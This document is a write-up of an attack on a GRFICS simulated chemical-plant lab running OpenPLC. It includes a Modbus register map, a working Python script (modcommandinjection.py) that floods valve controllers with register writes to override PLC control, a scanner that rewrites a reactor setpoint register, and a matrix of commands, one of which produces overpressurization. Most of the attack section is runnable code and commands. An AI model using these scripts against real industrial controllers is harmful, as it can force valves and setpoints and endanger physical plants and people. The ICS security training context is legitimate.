# Modbus Command Injection & Register Mapping Documentation

## 1. Infrastructure & Target Architecture

The target environment is a local **GRFICS (Graphical Realism Framework for Industrial Control Systems)** chemical plant simulation stack running OpenPLC and Modbus TCP services across isolated container networks.

### Container Topology (`docker ps`)

* **Attacker Workstation (`kali`)**: `fortiphyd/grfics-attacker` (Container ID: `197b44d78032`, VNC: `6088->6080/tcp`)

* **HMI / SCADA**: `fortiphyd/grfics-scadalts` (Container ID: `4fb24f72da37`, Web: `6081->8080/tcp`)

* **Engineering Workstation (`EWS`)**: `fortiphyd/grfics-workstation` (Container ID: `fc4315a03d42`, VNC: `6080->6080/tcp`)

* **3D Process Simulator**: `fortiphyd/grfics-simulation` (Container ID: `cf893d2ebb40`, Web/3D GUI: `80->80/tcp`)

* **Programmable Logic Controller (`plc`)**: `fortiphyd/grfics-plc` running OpenPLC (Container ID: `70cda4a14383`, `192.168.95.2:502`, Web UI: `8080->8080/tcp`)

* **Control / Network Router**: `fortiphyd/grfics-router` (Container ID: `e6f5b2e3e332`, WireGuard/VPN: `51820/udp`)

* **Command & Control**: `fortiphyd/grfics-caldera` (Container ID: `d78fb4a6e770`, Port: `8888/tcp`)

### Target Device IP Allocation

* **Feed 1 Valve**: `192.168.95.10`

* **Feed 2 Valve**: `192.168.95.11`

* **Purge Valve**: `192.168.95.12`

* **Product Valve**: `192.168.95.13`

## 2. Modbus Register Mapping & Reconnaissance

Modbus TCP scanning against OpenPLC (`192.168.95.2:502`) identified non-zero holding registers (`FC3`) and input registers (`FC4`).

### Holding Registers (FC3 / FC16)

| 

| **Register Address** | **Type / Mapping** | **Observed Value** | **Writable Status & Behavioral Analysis** | 
| **HR 100** | Output Word (`%QW`) | `65535` | **Transient Write**: Overwritten every PLC scan cycle. Single writes (e.g., `30000`) immediately revert to computed state (`65535`). | 
| **HR 102** | Output Register | `65535` | Active actuator register. | 
| **HR 103** | System Register | `50458` | Internal PLC process parameter. | 
| **HR 1024** | Memory Word (`%MW`) | `30000` | Internal memory region. | 
| **HR 1025** | Memory Word (`%MW`) | `30801` | Internal memory region. | 
| **HR 1026** | Memory Word (`%MW`) | `55295` / `45000` | **Persistently Writable**: Holds written values across PLC scan cycles (e.g., writing `45000` succeeds and persists). Modifies setpoint logic directly. | 
| **HR 1027** | Memory Word (`%MW`) | `31675` | Control loop variable. | 
| **HR 1028** | Memory Word (`%MW`) | `28835` | Control loop variable. | 

### Input Registers (FC4 - Read Only Telemetry)

| **Register Address** | **Sample Readout** | **Functional Description** | 
| **IR 100** | `65535` | Primary process telemetry stream | 
| **IR 101** | `41972` | Secondary process sensor feed | 
| **IR 104** | `65535` | Primary level/pressure sensor | 
| **IR 105** | `58802` | Reactor vessel telemetry | 
| **IR 106** | `49808` | Flow sensor input | 
| **IR 107** | `21177` | Auxiliary process monitoring | 
| **IR 108** | `55309` | Purge telemetry input | 
| **IR 109** | `28900` | Discharge telemetry input | 
| **IR 110** | `30948` | System pressure register | 
| **IR 111** | `6861` | Flow feedback register | 
| **IR 112** | `27724` | Temperature / level feedback | 

## 3. Exploit Scripts & Automation

### 3.1 Actuator Command Injection (`modcommandinjection.py`)

This script uses multithreading to launch continuous Modbus TCP `write_registers` (FC16) requests to valve controller IP addresses at $10\text{ ms}$ intervals (`sleep(0.01)`), winning the race condition against legitimate PLC control loops.

```
#!/usr/bin/env python3
import sys
import time
import threading
from pymodbus.client import ModbusTcpClient

# Target valve IP addresses in GRFICS
VALVE_IPS = {
    "feed1": "192.168.95.10",
    "feed2": "192.168.95.11",
    "purge": "192.168.95.12",
    "product": "192.168.95.13",
}


def override_valve(name, ip_address, target_value):
    """
    Continuously writes the specified value to one valve.
    """
    print(f"[+] {name}: {ip_address} -> {target_value}")

    client = ModbusTcpClient(ip_address, port=502)

    if not client.connect():
        print(f"[-] Failed to connect to {ip_address}")
        return

    values_to_write = [target_value] * 10

    try:
        while True:
            client.write_registers(
                address=0,
                values=values_to_write
            )
            time.sleep(0.01)

    except KeyboardInterrupt:
        pass

    finally:
        client.close()
        print(f"\n[*] Stopped {name} ({ip_address})")


if __name__ == "__main__":

    if len(sys.argv) != 5:
        print("Usage:")
        print("  python3 modcommandinjection.py <feed1> <feed2> <purge> <product>")
        print()
        print("Example:")
        print("  python3 modcommandinjection.py 0 65535 0 65535")
        sys.exit(1)

    feed1_value = int(sys.argv[1])
    feed2_value = int(sys.argv[2])
    purge_value = int(sys.argv[3])
    product_value = int(sys.argv[4])

    values = {
        "feed1": feed1_value,
        "feed2": feed2_value,
        "purge": purge_value,
        "product": product_value,
    }

    print("[*] Starting Modbus writes:")
    print(f"    Feed 1 : {feed1_value}")
    print(f"    Feed 2 : {feed2_value}")
    print(f"    Purge  : {purge_value}")
    print(f"    Product: {product_value}")

    threads = []

    for name, ip in VALVE_IPS.items():
        t = threading.Thread(
            target=override_valve,
            args=(name, ip, values[name])
        )
        t.daemon = True
        threads.append(t)
        t.start()

    try:
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[!] Stopping injection threads...")

```

### 3.2 Register Scanner & Persistence Verification (`scan.py`)

```
from pymodbus.client import ModbusTcpClient
import time

PLC_IP = "192.168.95.2"
client = ModbusTcpClient(PLC_IP, port=502)

if client.connect():
    print("[+] Connected to OpenPLC")

    # HR 100 (%QW) - Overwritten by PLC scan cycle
    print("\n--- Testing HR 100 (%QW Output Word) ---")
    client.write_register(100, 30000)
    time.sleep(0.5)
    res = client.read_holding_registers(100, count=1)
    if not res.isError():
        print(f"HR 100 Readback: {res.registers[0]} (Recomputed by PLC if 65535)")

    # HR 1026 (%MW) - Internal memory setpoint space
    print("\n--- Testing HR 1026 (%MW Memory Word) ---")
    target_sp = 45000  # Alters reactor setpoint
    client.write_register(1026, target_sp)
    time.sleep(0.5)
    res_sp = client.read_holding_registers(1026, count=1)
    if not res_sp.isError():
        print(f"HR 1026 Readback: {res_sp.registers[0]} (Holds value if write succeeded)")

    client.close()
else:
    print("[-] Connection to OpenPLC failed")

```

## 4. Physical State Execution Matrix

| **Test Scenario** | **Executed Command** | **Injected Values (F1, F2, Purge, Prod)** | **Physical Plant State Observed** | 
| **All Valves Closed** | `python3 modcommandinjection.py 0 0 0 0` | `0, 0, 0, 0` | All valve indicators display `0` (Red/Closed). All fluid lines closed. | 
| **All Valves Fully Open** | `python3 modcommandinjection.py 65535 65535 65535 65535` | `65535, 65535, 65535, 65535` | All valve indicators display `100` (Green/Open). Maximum fluid throughput. | 
| **Feed Inflow Only** | `python3 modcommandinjection.py 65535 65535 0 0` | `65535, 65535, 0, 0` | Feed 1 & 2 display `100` (Green); Purge & Product display `0` (Red). Overpressurization condition. | 

## 5. Network Traffic & Protocol Analysis (Packet Inspection)

Packet inspection captured on interface `eth1` (`writesinglecommand.jpg`) reveals individual control command executions transmitted to/from OpenPLC (`192.168.95.2`).

```
Frame 3210: 78 bytes on wire (624 bits) on interface eth1
Ethernet II, Src: c2:f8:62:a3:88:cb, Dst: 4e:76:c0:e5:bd:e8
Internet Protocol Version 4, Src: 192.168.95.2, Dst: 192.168.90.107
Transmission Control Protocol, Src Port: 502, Dst Port: 46114

```

### Modbus TCP Packet Structure Breakdown (Frame 3210)

* **Transaction Identifier**: `4629` (`0x1215` in hex payload)

* **Protocol Identifier**: `0` (Standard Modbus TCP)

* **Length**: `6` bytes following

* **Unit Identifier**: `1`

* **Function Code**: `5` (`Write Single Coil` / `0x05`)

* **Reference Number (Coil Address)**: `40` (`0x0028`)

* **Data Payload**: `0000` (`0x0000` - Coil OFF state)

### Raw Hex Payload Dissection

```
Offset  Hex Data                                            ASCII / Decoded
0000    4e 76 c0 e5 bd e8 c2 f8  62 a3 88 cb 08 00 45 00    Ethernet II / IPv4 Header
0010    00 40 57 e6 40 00 3f 06  a9 13 c0 a8 5f 02 c0 a8    IP Src: 192.168.95.2, Dst: 192.168.90.107
0020    5a 6b 01 f6 b4 22 c3 d2  36 a8 81 5a 69 4e 80 18    TCP Src Port: 502, Dst Port: 46114
0030    00 40 3a f1 00 00 01 01  08 0a 11 82 29 1e 41 d8    TCP Options & Timestamp
0040    8a ee 12 15 00 00 00 06  01 05 00 28 00 00          Modbus MBAP + FC5 Payload

```

#### Key Payload Byte Mapping

* `12 15`: Transaction ID (`4629`)

* `00 00`: Protocol ID (`0 = Modbus TCP`)

* `00 06`: Length field (`6` remaining bytes)

* `01`: Unit ID (`1`)

* `05`: Function Code `5` (`Write Single Coil`)

* `00 28`: Coil Address `40` (`0x0028`)

* `00 00`: Value (`0x0000 = OFF`)

```
eof

```
